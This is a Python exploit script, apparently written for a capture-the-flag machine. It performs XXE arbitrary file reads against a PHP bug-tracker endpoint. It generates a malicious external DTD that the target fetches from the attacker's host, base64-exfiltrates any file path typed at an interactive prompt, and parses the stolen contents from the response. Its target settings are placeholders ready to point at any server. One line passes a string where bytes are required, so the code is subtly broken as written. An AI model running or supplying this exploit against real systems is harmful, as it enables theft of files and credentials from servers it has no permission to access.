#! /usr/bin/python3
"""
Note, you must run a web server in the same directory as this file. E.g:
    sudo python3 -m http.server 1234
This is used to serve the external DTD which uses trickery to reduce the likelihood of a file not being served because it
contains bad characters.

Install requests with pip if you don't already have it:
    python3 -m pip install requests
"""

import requests
import re
import base64
from urllib.parse import quote

LHOST = "10.10.14.102"  # Change ME!
LPORT = "1234"  # Change ME!
RHOST = "10.129.95.166"  # Change ME!
PATH = "/tracker_diRbPr00f314.php"  # Change ME!

# This regex extracts the actual file contents from the page. This will need to be changed to tailor to your site.
# I recommend using regex101.com
regex = r"If DB were ready, would have added:\s*<table>\s*<tr>\s*<td>Title:</td>\s*<td>title</td>\s*</tr>\s*<tr>\s*<td>CWE:</td>\s*<td>cwe</td>\s*</tr>\s*<tr>\s*<td>Score:</td>\s*<td>cvss</td>\s*</tr>\s*<tr>\s*<td>Reward:</td>\s*<td>(.*)</td>\s*</tr>\s*</table>"

dtd = """<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={}">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">"""

xml = f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://{LHOST}:{LPORT}/attacker.dtd">
  %dtd;
  %all;
]>
        <bugreport>
        <title>title</title>
        <cwe>cwe</cwe>
        <cvss>cvss</cvss>
        <reward>&fileContents;</reward>
        </bugreport>"""

data = f"""data={quote(base64.b64encode(xml))}"""

headers = {
    "Host": RHOST,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": f"http://{RHOST}",
    "Connection": "close",
    "Referer": f"http://{RHOST}/log_submit.php",
}

while True:
    path = input("$ ")

    with open("attacker.dtd", "w") as o:
        dtd_data = dtd.format(path)
        o.write(dtd_data)

    response = requests.post(
        f"http://{RHOST}/{PATH}", headers=headers, data=data, verify=False
    )

    matches = re.findall(regex, response.text, re.MULTILINE | re.DOTALL)
    if matches and matches[0]:
        print(base64.b64decode(matches[0]).decode())
    else:
        print("No data returned. The file may not exist or you don't have permission to view it.")
